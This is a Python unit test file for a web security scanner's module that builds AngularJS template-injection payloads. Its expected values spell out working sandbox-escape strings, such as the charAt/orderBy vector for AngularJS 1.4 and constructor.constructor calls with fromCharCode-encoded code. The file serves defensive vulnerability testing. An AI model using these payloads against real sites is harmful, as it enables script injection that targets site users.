"""Unit tests for the pure AngularJS CSTI synthesis grammar/builders (no browser).

These assert that, given which primitives verified, the builders assemble the correct composed
expression — and that the no-strings builder reproduces the published 1.4 vector exactly (so
synthesis is provably equivalent to the curated cheat-sheet form, not a lookup)."""

from __future__ import annotations

from dast.payloads.loader import get_value
from dast.triage import xss_synthesis as synth


def test_char_codes_for_x_assign_alert():
    # x=alert(1) → the exact fromCharCode sequence the published 1.4 no-strings vector carries.
    assert synth.char_codes("x=alert(1)") == [120, 61, 97, 108, 101, 114, 116, 40, 49, 41]


def test_fromcharcode_expr_builds_without_literals():
    expr = synth.fromcharcode_expr("x=alert(1)")
    assert expr == ("toString().constructor.fromCharCode("
                    "120,61,97,108,101,114,116,40,49,41)")
    assert '"' not in expr and "'" not in expr  # no string literal anywhere


def test_effect_string_wraps_assignment():
    assert synth.effect_string("alert(1)") == "x=alert(1)"
    assert synth.effect_string("alert(424242)") == "x=alert(424242)"


def test_charat_payload_key_delivery_matches_published_vector():
    # The synthesized escape must equal the curated angular_no_strings 1.4 vector verbatim.
    built = synth.charat_payload("alert(1)", key_delivery=True)
    stored = (get_value("xss", "angular_no_strings", {}) or {})["1.4"][0]
    assert built == stored
    assert built == (
        "toString().constructor.prototype.charAt=[].join;"
        "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    )


def test_charat_payload_value_delivery_drops_key_suffix():
    value = synth.charat_payload("alert(1)", key_delivery=False)
    assert value.endswith("fromCharCode(120,61,97,108,101,114,116,40,49,41)")
    assert not value.endswith("=1")
    # Same escape structure, just without the trailing KEY→value separator.
    assert value + "=1" == synth.charat_payload("alert(1)", key_delivery=True)


def test_charat_payload_uses_mark_in_codes():
    # alert(777) → codes include 55,55,55 (three '7') inside the x=alert(...) string.
    built = synth.charat_payload("alert(777)", key_delivery=True)
    codes = synth.char_codes("x=alert(777)")
    assert ",".join(str(c) for c in codes) in built


def test_constructor_payload_with_and_without_strings():
    with_strings = synth.constructor_payload("alert(1)", strings_ok=True)
    assert with_strings == "constructor.constructor('alert(1)')()"

    no_strings = synth.constructor_payload("alert(1)", strings_ok=False)
    assert no_strings == ("constructor.constructor("
                          "toString().constructor.fromCharCode(97,108,101,114,116,40,49,41))()")
    assert "'" not in no_strings and '"' not in no_strings


def test_oracle_and_primitive_probes():
    assert synth.oracle_probe() == ("7*7", "49")

    fc_expr, fc_exp = synth.fromcharcode_probe()
    assert fc_exp == synth.SENTINEL_STR
    assert fc_expr == synth.fromcharcode_expr(synth.SENTINEL_STR)

    c_expr, c_exp = synth.constructor_probe()
    assert c_exp == synth.SENTINEL_STR
    assert c_expr.startswith("constructor.constructor(")
    assert "fromCharCode(" in c_expr  # code body built without a literal
    assert '"' not in c_expr

    ch_expr, ch_exp = synth.charat_probe()
    assert ch_exp == synth.SENTINEL_STR
    assert ch_expr.startswith("toString().constructor.prototype.charAt=[].join;")
    assert ch_expr.endswith(synth.fromcharcode_expr(synth.SENTINEL_STR))


def test_primitives_fall_back_to_defaults(monkeypatch):
    # A trimmed library (angular_primitives absent) must not break synthesis — defaults apply.
    import dast.triage.xss_synthesis as mod
    real = mod.get_value

    def fake(category, key, default=None):
        if (category, key) == ("xss", "angular_primitives"):
            return {}
        return real(category, key, default)

    monkeypatch.setattr(mod, "get_value", fake)
    assert mod.charat_payload("alert(1)", key_delivery=True) == (
        "toString().constructor.prototype.charAt=[].join;"
        "[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
    )
